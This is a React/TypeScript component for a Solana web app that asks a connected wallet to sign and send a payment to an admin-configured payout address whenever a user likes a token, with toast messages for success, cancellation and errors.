import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildLikePaymentTransaction } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent') || lower.includes('insufficient funds')) {
    return 'Not enough SOL to pay the network fee for this transfer.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, signTransaction } = useWallet()
  const { connection } = useConnection()
  const [, setSubmitting] = useState(false)
  const inFlight = useRef(false)

  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (!publicKeyRef.current || !walletAddress) {
        openWalletModalRef.current()
        return
      }

      let config: PayoutConfig = getLocalPayoutConfig()
      try {
        config = await loadPayoutConfig()
      } catch {
        /* use the address saved in this browser */
      }
      if (!isValidSolanaAddress(config.walletAddress)) {
        toast.error('Save a payout address in admin before a like can request a payment.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      closeWalletModalRef.current()

      try {
        const payment = await buildLikePaymentTransaction({
          connection: connectionRef.current,
          from: publicKeyRef.current,
          config,
        })
        toast(`Approve ${payment.label} in your wallet to like this token.`)
        const signed = await signTransactionRef.current?.(payment.transaction)
        if (!signed) {
          toast.error('The wallet did not approve the payment.')
          return
        }
        await connectionRef.current.sendRawTransaction(signed.serialize(), {
          skipPreflight: false,
          preflightCommitment: 'confirmed',
          maxRetries: 3,
        })
        notifyFundsConfirmed(peekPendingLike())
        toast.success(`Sent ${payment.label}`)
      } catch (err) {
        const message = isWalletUserCancel(err) ? 'Payment cancelled' : sendErrorMessage(err)
        toast.error(message)
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
    }
  }, [connected, walletAddress])

  return null
}
